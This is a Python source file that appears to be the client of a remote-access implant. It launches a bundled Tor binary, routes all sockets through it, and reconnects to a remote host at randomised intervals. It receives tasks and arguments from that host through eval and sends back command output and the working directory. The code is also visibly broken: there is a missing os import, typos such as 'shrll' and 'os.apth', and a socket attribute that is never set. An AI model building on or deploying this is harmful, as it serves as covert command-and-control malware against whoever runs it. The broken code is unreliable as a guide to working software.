from tarfile import ENCODING
from traceback import print_tb
import socks 
import socket
import subprocess as sp
import sys
from time import sleep
from random import randint
class Tor:
    TOR_PATH_WIN = '.\\torbundle\\Tor\\tor.exe'
    TOR_PATH_LINUX = './tor_linux/tor'
    def __init__(self):
        self.tor_process = self.start()
        socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
        socket.socket = socks.socksocket
    def start(self):
        try:
            if os.name == 'nt':
                path = Tor.resource_path(self.TOR_PATH_WIN)
            else:
                path = Tor.resource_path(self.TOR_PATH_LINUX)
                sp.Popen(['chmod', '+x', path])
            tor_process = sp.Popen(path, shrll=True, stdout=sp.PIPE, stderr=sp.PIPE)
            print(tor_process.stdout.read() + tor_process.stderr.read())
        except Exception as error:
            print(str(error))
            sys.exit(2)
        print('Started tor')
        return tor_process
    @staticmethod
    def resource_path(relative_path):
        base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.apth.abspath(__file__)))
        return os.path.join(base_path, relative_path)
class ClientSocket:
    ENCODING = 'UTF-8'
    CONNECTION_TIMEOUT = 60
    def __init__(self, remote_host, remote_port):
        self.remote_addr = (remote_host, remote_port)
        self.sock = self.create_connection()
    def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(self.remote_addr)
        except Exception as err:
            print(err)
            timeout = randint(self.CONNECTION_TIMEOUT - 30, self.CONNECTION_TIMEOUT + 30)
            sleep(timeout)
            self.create_connection()
        else:
            return sock
    def send(self, output):
        try:
            cwd = os.getcwd()
            data = {'output': output, 'cwd': cwd}
            self.__sock.send(str(data).encode(self.ENCODING))
        except socket.error:
            raise()
    def receive(self,num_bytes):
        try: 
            data = self.__sock.recv(num_bytes)
            data = data.decode(self.ENCODING)
            data = eval(data)
        except socket.error:
            raise()
        else:
            return data['task'], data['args']
    def __del__(self):
        try:
            self.__sock.close()
        except NameError:
            pass